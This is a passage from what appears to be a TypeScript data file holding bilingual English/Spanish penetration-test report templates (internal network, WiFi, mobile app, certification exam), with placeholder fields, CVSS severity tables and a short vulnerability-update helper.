This report presents the findings from an internal network penetration test for **[TODO Client Name]**. The assessment simulated an attacker who has already gained initial access to the internal corporate network (e.g., a malicious insider or a compromised workstation). The goal was to identify vulnerabilities that could lead to privilege escalation, lateral movement, and compromise of critical internal systems like Domain Controllers.

---

<!-- section-id: template-3-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]** from the perspective of an authenticated, non-privileged user on the internal network (gray-box).

### Scope
- **Internal Network Segments:** [TODO list of IPs/ranges, e.g., 192.168.1.0/24]
- **Key Systems:** [TODO e.g., Domain Controllers, File Servers]

### Methodology
1. **Internal Reconnaissance:** Enumerating hosts, services, users, and shares.
2. **Vulnerability Analysis:** Identifying misconfigurations, missing patches, and weak protocols.
3. **Lateral Movement & Privilege Escalation:** Exploiting vulnerabilities to move across the network and escalate privileges.
4. **Domain Dominance:** Attempting to compromise the Active Directory domain.
5. **Reporting:** Documenting attack paths and providing remediation guidance.

---

<!-- section-id: template-3-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial internal access to domain compromise.]

---

<!-- section-id: template-3-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that lead to Domain Admin compromise or control of critical servers. |
| High | 7.0 - 8.9 | Vulnerabilities allowing for significant privilege escalation or lateral movement. |
| Medium | 4.0 - 6.9 | Misconfigurations or weaknesses that could aid an attacker in reconnaissance or further attacks. |
| Low | 0.1 - 3.9 | Minor issues that represent a deviation from best practices. |
| Informational | 0.0 | Observations about the internal network environment. |`,
    scope_es:
`<!-- section-id: template-3-es-1 -->

## Resumen Ejecutivo
Este informe presenta los hallazgos de una prueba de penetración de la red interna para **[TODO Nombre del Cliente]**. La evaluación simuló a un atacante que ya ha obtenido acceso inicial a la red corporativa interna (p. ej., un empleado malintencionado o una estación de trabajo comprometida). El objetivo fue identificar vulnerabilidades que pudieran conducir a la escalada de privilegios, movimiento lateral y compromiso de sistemas internos críticos como los Controladores de Dominio.

---

<!-- section-id: template-3-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]** desde la perspectiva de un usuario autenticado y sin privilegios en la red interna (caja gris).

### Alcance
- **Segmentos de Red Interna:** [TODO lista de IPs/rangos, p. ej., 192.168.1.0/24]
- **Sistemas Clave:** [TODO p. ej., Controladores de Dominio, Servidores de Archivos]

### Metodología
1. **Reconocimiento Interno:** Enumeración de hosts, servicios, usuarios y recursos compartidos.
2. **Análisis de Vulnerabilidades:** Identificación de configuraciones incorrectas, parches faltantes y protocolos débiles.
3. **Movimiento Lateral y Escalada de Privilegios:** Explotación de vulnerabilidades para moverse a través de la red y escalar privilegios.
4. **Dominio del Dominio:** Intento de comprometer el dominio de Active Directory.
5. **Reporte:** Documentación de las rutas de ataque y provisión de guías de remediación.

---

<!-- section-id: template-3-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el acceso interno inicial hasta el compromiso del dominio.]

---

<!-- section-id: template-3-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que conducen al compromiso del Administrador del Dominio o al control de servidores críticos. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que permiten una escalada de privilegios significativa o movimiento lateral. |
| Media | 4.0 - 6.9 | Configuraciones incorrectas o debilidades que podrían ayudar a un atacante en el reconocimiento o ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que representan una desviación de las mejores prácticas. |
| Informativa | 0.0 | Observaciones sobre el entorno de la red interna. |`,
    appendix_en: `
<!-- section-id: template-3-en-appendix-1 -->

### A. Host & Service Discovery
| IP Address | Port | Service | Notes |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |

---

<!-- section-id: template-3-en-appendix-2 -->

### B. Compromised Credentials
| Username | Domain | Password / Hash | Source |
|---|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] | [TODO e.g., Kerberoasting] |
`,
    appendix_es: `
<!-- section-id: template-3-es-appendix-1 -->

### A. Descubrimiento de Hosts y Servicios
| Dirección IP | Puerto | Servicio | Notas |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |

---

<!-- section-id: template-3-es-appendix-2 -->

### B. Credenciales Comprometidas
| Usuario | Dominio | Contraseña / Hash | Origen |
|---|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] | [TODO p. ej., Kerberoasting] |
`
  },
  {
    id: 'template-wifi',
    name_en: 'WiFi Audit',
    name_es: 'Auditoría WiFi',
    icon: 'Wifi',
    description_en: 'Assesses wireless network security, including password cracking and client isolation.',
    description_es: 'Evalúa la seguridad de redes inalámbricas, incluyendo cracking de contraseñas y aislamiento de clientes.',
    scope_en:
`<!-- section-id: template-wifi-en-1 -->

## Executive Summary
This report summarizes the security assessment of the wireless networks at **[TODO Client Name]**. The audit focused on identifying vulnerabilities related to authentication, encryption, and client segregation that could allow an unauthorized user to gain access to the corporate or guest wireless networks.

---

<!-- section-id: template-wifi-en-2 -->

## Scope & Methodology
The assessment was conducted on **[TODO Date]** at the **[TODO Physical Location]** premises.

### Scope
- **Corporate WiFi Network:** SSID "[TODO Specify Corporate SSID]"
- **Guest WiFi Network:** SSID "[TODO Specify Guest SSID]"

### Methodology
1. **Reconnaissance:** Identifying visible and hidden wireless networks.
2. **Authentication Attacks:** Attempting to crack the Pre-Shared Key (PSK) via captured handshakes.
3. **Client-Side Attacks:** Performing "Evil Twin" and captive portal attacks.
4. **Post-Authentication Analysis:** Assessing client isolation and access to internal resources after connecting.
5. **Reporting:** Detailing findings and providing security recommendations.

---

<!-- section-id: template-wifi-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, such as capturing a WPA handshake and cracking it, or setting up an Evil Twin AP.]

---

<!-- section-id: template-wifi-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that allow direct access to the internal corporate network. |
| High | 7.0 - 8.9 | Weaknesses that allow an attacker to decrypt traffic or impersonate legitimate users. |
| Medium | 4.0 - 6.9 | Issues like lack of client isolation on guest networks or weak captive portals. |
| Low | 0.1 - 3.9 | Deviations from best practices, such as broadcasting unnecessary SSIDs. |
| Informational | 0.0 | General observations about the wireless environment. |`,
    scope_es:
`<!-- section-id: template-wifi-es-1 -->

## Resumen Ejecutivo
Este informe resume la evaluación de seguridad de las redes inalámbricas en **[TODO Nombre del Cliente]**. La auditoría se centró en identificar vulnerabilidades relacionadas con la autenticación, el cifrado y la segregación de clientes que podrían permitir a un usuario no autorizado obtener acceso a las redes inalámbricas corporativas o de invitados.

---

<!-- section-id: template-wifi-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo el **[TODO Fecha]** en las instalaciones de **[TODO Ubicación Física]**.

### Alcance
- **Red WiFi Corporativa:** SSID "[TODO Especificar SSID Corporativo]"
- **Red WiFi de Invitados:** SSID "[TODO Especificar SSID de Invitados]"

### Metodología
1. **Reconocimiento:** Identificación de redes inalámbricas visibles y ocultas.
2. **Ataques de Autenticación:** Intento de crackear la Clave Pre-Compartida (PSK) a través de handshakes capturados.
3. **Ataques del Lado del Cliente:** Realización de ataques "Evil Twin" y de portal cautivo.
4. **Análisis Post-Autenticación:** Evaluación del aislamiento de clientes y el acceso a recursos internos después de la conexión.
5. **Reporte:** Detalle de los hallazgos y provisión de recomendaciones de seguridad.

---

<!-- section-id: template-wifi-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, como la captura de un handshake WPA y su crackeo, o la configuración de un AP Evil Twin.]

---

<!-- section-id: template-wifi-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que permiten el acceso directo a la red corporativa interna. |
| Alta | 7.0 - 8.9 | Debilidades que permiten a un atacante descifrar el tráfico o suplantar a usuarios legítimos. |
| Media | 4.0 - 6.9 | Problemas como la falta de aislamiento de clientes en redes de invitados o portales cautivos débiles. |
| Baja | 0.1 - 3.9 | Desviaciones de las mejores prácticas, como la difusión de SSIDs innecesarios. |
| Informativa | 0.0 | Observaciones generales sobre el entorno inalámbrico. |`,
    appendix_en: `
<!-- section-id: template-wifi-en-appendix-1 -->

### A. Discovered Wireless Networks
| SSID | BSSID | Signal Strength | Encryption | Authentication |
|---|---|---|---|---|
| [TODO FILL IN] | | | | |

---

<!-- section-id: template-wifi-en-appendix-2 -->

### B. Cracked Passwords
| SSID | Password | Cracking Method |
|---|---|---|
| [TODO FILL IN] | | |
`,
    appendix_es: `
<!-- section-id: template-wifi-es-appendix-1 -->

### A. Redes Inalámbricas Descubiertas
| SSID | BSSID | Potencia de Señal | Cifrado | Autenticación |
|---|---|---|---|---|
| [TODO RELLENAR] | | | | |

---

<!-- section-id: template-wifi-es-appendix-2 -->

### B. Contraseñas Crackeadas
| SSID | Contraseña | Método de Crackeo |
|---|---|---|
| [TODO RELLENAR] | | |
`
  },
   {
    id: 'template-mobile',
    name_en: 'Mobile App Audit',
    name_es: 'Auditoría de App Móvil',
    icon: 'Smartphone',
    description_en: 'A security assessment of Android and/or iOS mobile apps, including static and dynamic analysis.',
    description_es: 'Evaluación de seguridad de apps móviles Android y/o iOS, incluyendo análisis estático y dinámico.',
    scope_en:
`<!-- section-id: template-mobile-en-1 -->

## Executive Summary
This report documents the findings of a security assessment of the **[TODO App Name]** mobile application (version [TODO App Version]) for **[TODO Client Name]**. The test focused on identifying vulnerabilities within the mobile application itself and its backend API interactions, covering areas such as insecure data storage, insecure communication, and client-side logic flaws.

---

<!-- section-id: template-mobile-en-2 -->

## Scope & Methodology
The assessment was conducted between **[TODO Start Date]** and **[TODO End Date]**.

### Scope
- **Android Application:** Package Name \`[TODO com.example.app]\`, provided as [TODO APK / Play Store link]
- **iOS Application:** Bundle ID \`[TODO com.example.app]\`, provided as [TODO IPA / App Store link]
- **Backend APIs:** The assessment included analysis of the API endpoints consumed by the mobile application, located at \`[TODO api.example.com]\`

### Methodology
1. **Static Analysis (SAST):** Analyzing the application's source code or decompiled code to find vulnerabilities without executing it.
2. **Dynamic Analysis (DAST):** Testing the application in a running state, both on a physical device and an emulator, to identify runtime vulnerabilities. This included intercepting network traffic with a proxy.
3. **API Testing:** Directly testing the backend API endpoints for common web vulnerabilities.
4. **Reporting:** Consolidating all findings and providing detailed remediation steps.

---

<!-- section-id: template-mobile-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the most significant attack path. For example, how insecure data storage was leveraged to extract an API key, which was then used to abuse a vulnerable API endpoint.]

---

<!-- section-id: template-mobile-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that allow for full compromise of user accounts or sensitive backend systems. |
| High | 7.0 - 8.9 | Vulnerabilities that expose sensitive user data or allow for significant unauthorized actions. |
| Medium | 4.0 - 6.9 | Weaknesses in the application that could be chained for a more significant attack or expose non-critical data. |
| Low | 0.1 - 3.9 | Issues that deviate from security best practices but have a low direct impact. |
| Informational | 0.0 | Observations about the application's security posture. |`,
    scope_es:
`<!-- section-id: template-mobile-es-1 -->

## Resumen Ejecutivo
Este informe documenta los hallazgos de una evaluación de seguridad de la aplicación móvil **[TODO Nombre de la App]** (versión [TODO Versión de la App]) para **[TODO Nombre del Cliente]**. La prueba se centró en identificar vulnerabilidades dentro de la propia aplicación móvil y sus interacciones con la API de backend, cubriendo áreas como el almacenamiento inseguro de datos, la comunicación insegura y los fallos en la lógica del lado del cliente.

---

<!-- section-id: template-mobile-es-2 -->

## Alcance y Metodología
La evaluación se llevó a cabo entre el **[TODO Fecha de Inicio]** y el **[TODO Fecha de Fin]**.

### Alcance
- **Aplicación Android:** Nombre del Paquete \`[TODO com.ejemplo.app]\`, proporcionada como [TODO enlace a APK / Play Store]
- **Aplicación iOS:** Bundle ID \`[TODO com.ejemplo.app]\`, proporcionada como [TODO enlace a IPA / App Store]
- **APIs de Backend:** La evaluación incluyó el análisis de los endpoints de la API consumidos por la aplicación móvil, ubicados en \`[TODO api.ejemplo.com]\`

### Metodología
1. **Análisis Estático (SAST):** Análisis del código fuente o código descompilado de la aplicación para encontrar vulnerabilidades sin ejecutarla.
2. **Análisis Dinámico (DAST):** Prueba de la aplicación en estado de ejecución, tanto en un dispositivo físico como en un emulador, para identificar vulnerabilidades en tiempo de ejecución. Esto incluyó la intercepción del tráfico de red con un proxy.
3. **Pruebas de API:** Prueba directa de los endpoints de la API de backend en busca de vulnerabilidades web comunes.
4. **Reporte:** Consolidación de todos los hallazgos y provisión de pasos detallados para la remediación.

---

<!-- section-id: template-mobile-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque más significativa. Por ejemplo, cómo se aprovechó el almacenamiento inseguro de datos para extraer una clave de API, que luego se usó para abusar de un endpoint de API vulnerable.]

---

<!-- section-id: template-mobile-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que permiten el compromiso total de las cuentas de usuario o de los sistemas de backend sensibles. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que exponen datos sensibles del usuario o permiten acciones no autorizadas significativas. |
| Media | 4.0 - 6.9 | Debilidades en la aplicación que podrían encadenarse para un ataque más significativo o exponer datos no críticos. |
| Baja | 0.1 - 3.9 | Problemas que se desvían de las mejores prácticas de seguridad pero tienen un bajo impacto directo. |
| Informativa | 0.0 | Observaciones sobre la postura de seguridad de la aplicación. |`,
    appendix_en: `
<!-- section-id: template-mobile-en-appendix-1 -->

### A. Hardcoded Secrets
| Secret | Location |
|---|---|
| [TODO e.g., API Key] | [TODO e.g., strings.xml] |

---

<!-- section-id: template-mobile-en-appendix-2 -->

### B. Insecurely Stored Data
| Data | Storage Method | Location |
|---|---|---|
| [TODO e.g., Session Token] | [TODO e.g., SharedPreferences] | [TODO e.g., /data/data/com.app/shared_prefs/prefs.xml] |
`,
    appendix_es: `
<!-- section-id: template-mobile-es-appendix-1 -->

### A. Secretos Embebidos en el Código
| Secreto | Ubicación |
|---|---|
| [TODO p. ej., Clave de API] | [TODO p. ej., strings.xml] |

---

<!-- section-id: template-mobile-es-appendix-2 -->

### B. Datos Almacenados Inseguramente
| Dato | Método de Almacenamiento | Ubicación |
|---|---|---|
| [TODO p. ej., Token de Sesión] | [TODO p. ej., SharedPreferences] | [TODO p. ej., /data/data/com.app/shared_prefs/prefs.xml] |
`
  },
  {
    id: 'cpts-template',
    name_en: 'Certification Report',
    name_es: 'Informe de Certificación',
    icon: 'Award',
    description_en: 'A generic template for offensive security certification reports (e.g., OSCP, CPTS).',
    description_es: 'Plantilla genérica para informes de certificación de seguridad ofensiva (p. ej., OSCP, CPTS).',
    scope_en: 
`<!-- section-id: cpts-template-en-1 -->

## Executive Summary
This report details the results of a penetration test performed on the [TODO Organization Name] enterprise network as part of the [TODO Certification Name] certification exam. The objective of this assessment was to identify and exploit security vulnerabilities to compromise the internal network and gain access to sensitive systems, simulating a real-world attack scenario. This report documents the attack path, findings, and provides a detailed narrative of the engagement.

---

<!-- section-id: cpts-template-en-2 -->

## Scope & Methodology
The scope of this penetration test was limited to the hosts and networks provided within the [TODO Exam Environment Name] environment. The assessment was conducted from an external attacker's perspective, with no prior knowledge of the internal network architecture.

### Scope
- **Included:** External IP addresses provided in the exam, and any hosts discovered and accessible from the initial foothold within the specified subnets.
- **Excluded:** Any hosts or networks outside of the designated exam infrastructure, Denial of Service (DoS) attacks, and social engineering attacks.

### Methodology
The penetration test followed a structured methodology:
1.  **Information Gathering:** Passive and active reconnaissance to map the external attack surface.
2.  **Vulnerability Identification:** Identifying potential weaknesses and entry points.
3.  **Exploitation:** Gaining an initial foothold and escalating privileges.
4.  **Post-Exploitation:** Pivoting through the internal network, identifying high-value targets, and exfiltrating data (flags).
5.  **Reporting:** Documenting all findings, exploitation paths, and recommendations.

---

<!-- section-id: cpts-template-en-3 -->

## Attack Narrative
[TODO Provide a step-by-step narrative of the attack path, from initial reconnaissance to the final flag capture. This should be detailed and easy to follow.]

---

<!-- section-id: cpts-template-en-4 -->

## Findings Classification
| Severity | CVSS v3.1 Score | Description |
|---|---|---|
| Critical | 9.0 - 10.0 | Vulnerabilities that lead to Domain Admin compromise or control of critical servers. |
| High | 7.0 - 8.9 | Vulnerabilities allowing for significant privilege escalation or lateral movement. |
| Medium | 4.0 - 6.9 | Misconfigurations or weaknesses that could aid an attacker in reconnaissance or further attacks. |
| Low | 0.1 - 3.9 | Minor issues that represent a deviation from best practices. |
| Informational | 0.0 | Observations about the network environment. |
`,
    scope_es:
`<!-- section-id: cpts-template-es-1 -->

## Resumen Ejecutivo
Se realizó una prueba de penetración contra la red empresarial de [TODO Nombre de la Organización] para el examen de certificación [TODO Nombre de la Certificación]. El objetivo de esta evaluación fue identificar e informar sobre las vulnerabilidades de seguridad que podrían ser explotadas por un atacante externo para comprometer la red interna y obtener acceso a datos o sistemas sensibles, simulando un escenario de ataque del mundo real. Este informe detalla los hallazgos de la evaluación y proporciona recomendaciones para su remediación.

---

<!-- section-id: cpts-template-es-2 -->

## Alcance y Metodología
El alcance de esta prueba de penetración se limitó a los hosts y redes proporcionados dentro del entorno de [TODO Nombre del Entorno del Examen]. La evaluación se realizó desde la perspectiva de un atacante externo, sin conocimiento previo de la arquitectura de la red interna.

### Alcance
- **Incluido:** Direcciones IP externas proporcionadas en el examen, y cualquier host descubierto y accesible desde el punto de apoyo inicial dentro de las subredes especificadas.
- **Excluido:** Cualquier host o red fuera de la infraestructura designada para el examen, ataques de Denegación de Servicio (DoS) e ingeniería social.

### Metodología
La prueba de penetración siguió una metodología estructurada:
1.  **Recopilación de Información:** Reconocimiento pasivo y activo para mapear la superficie de ataque externa.
2.  **Identificación de Vulnerabilidades:** Identificación de posibles debilidades y puntos de entrada.
3.  **Explotación:** Obtención de un punto de apoyo inicial y escalada de privilegios.
4.  **Post-Explotación:** Pivotar a través de la red interna, identificando objetivos de alto valor y exfiltrando datos (banderas).
5.  **Elaboración de Informes:** Documentación de todos los hallazgos, rutas de explotación y recomendaciones.

---

<!-- section-id: cpts-template-es-3 -->

## Narrativa del Ataque
[TODO Proporcione una narrativa paso a paso de la ruta de ataque, desde el reconocimiento inicial hasta la captura de la bandera final. Debe ser detallada y fácil de seguir.]

---

<!-- section-id: cpts-template-es-4 -->

## Clasificación de Hallazgos
| Severidad | Puntuación CVSS v3.1 | Descripción |
|---|---|---|
| Crítica | 9.0 - 10.0 | Vulnerabilidades que conducen al compromiso del Administrador de Dominio o al control de servidores críticos. |
| Alta | 7.0 - 8.9 | Vulnerabilidades que permiten una escalada de privilegios significativa o movimiento lateral. |
| Media | 4.0 - 6.9 | Configuraciones incorrectas o debilidades que podrían ayudar a un atacante en el reconocimiento o ataques posteriores. |
| Baja | 0.1 - 3.9 | Problemas menores que representan una desviación de las mejores prácticas. |
| Informativa | 0.0 | Observaciones sobre el entorno de la red. |
`,
    appendix_en: `
<!-- section-id: cpts-template-en-appendix-1 -->

### A. Compromised Users
| Username | Domain | Password |
|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] |

---

<!-- section-id: cpts-template-en-appendix-2 -->

### B. Exploited Hosts
| Hostname | IP Address | Operating System |
|---|---|---|
| [TODO WEB01] | [TODO 192.168.X.X] | [TODO Windows Server 2019] |

---

<!-- section-id: cpts-template-en-appendix-3 -->

### C. Flags Captured
| Host | Flag Type | Flag Value |
|---|---|---|
| [TODO WEB01] | user.txt | [TODO flag_value] |

---

<!-- section-id: cpts-template-en-appendix-4 -->

### D. Host & Service Discovery
| IP Address | Port | Service | Notes |
|---|---|---|---|
| [TODO FILL IN AS APPROPRIATE] | | | |

---

<!-- section-id: cpts-template-en-appendix-5 -->

### E. Subdomain Discovery
| URL | Description | Discovery Method |
|---|---|---|
| [TODO FILL IN DISCOVERED VHOSTS/SUBDOMAINS] | | |

---

<!-- section-id: cpts-template-en-appendix-6 -->

### F. Tools Used
[TODO List the primary tools used during the assessment.]
- Nmap
- Metasploit Framework
- Mimikatz
- BloodHound
- Impacket Suite
- Burp Suite
`,
    appendix_es: `
<!-- section-id: cpts-template-es-appendix-1 -->

### A. Usuarios Comprometidos
| Usuario | Dominio | Contraseña |
|---|---|---|
| [TODO user1] | [TODO domain.local] | [TODO Password123] |

---

<!-- section-id: cpts-template-es-appendix-2 -->

### B. Hosts Explotados
| Hostname | Dirección IP | Sistema Operativo |
|---|---|---|
| [TODO WEB01] | [TODO 192.168.X.X] | [TODO Windows Server 2019] |

---

<!-- section-id: cpts-template-es-appendix-3 -->

### C. Banderas Capturadas
| Host | Tipo de Bandera | Valor de la Bandera |
|---|---|---|
| [TODO WEB01] | user.txt | [TODO flag_value] |

---

<!-- section-id: cpts-template-es-appendix-4 -->

### D. Descubrimiento de Hosts y Servicios
| Dirección IP | Puerto | Servicio | Notas |
|---|---|---|---|
| [TODO RELLENAR SEGÚN CORRESPONDA] | | | |

---

<!-- section-id: cpts-template-es-appendix-5 -->

### E. Descubrimiento de Subdominios
| URL | Descripción | Método de Descubrimiento |
|---|---|---|
| [TODO RELLENAR VHOSTS/SUBDOMINIOS DESCUBIERTOS] | | |

---

<!-- section-id: cpts-template-es-appendix-6 -->

### F. Herramientas Utilizadas
[TODO Enumere las principales herramientas utilizadas durante la evaluación.]
- Nmap
- Metasploit Framework
- Mimikatz
- BloodHound
- Impacket Suite
- Burp Suite
`
  }
];

// Functions to add/update data - in a real app this would interact with an API
export const updateVulnerability = (updatedVuln: Vulnerability) => {
  vulnerabilities = vulnerabilities.map(v => v.id === updatedVuln.id ? updatedVuln : v);
};

export const addVulnerability = (newVuln: Omit<Vulnerability, 'id'>) => {
  const newId = `vuln-${Date.now()}`;
  vulnerabilities.push({ id: newId, ...newVuln });
};
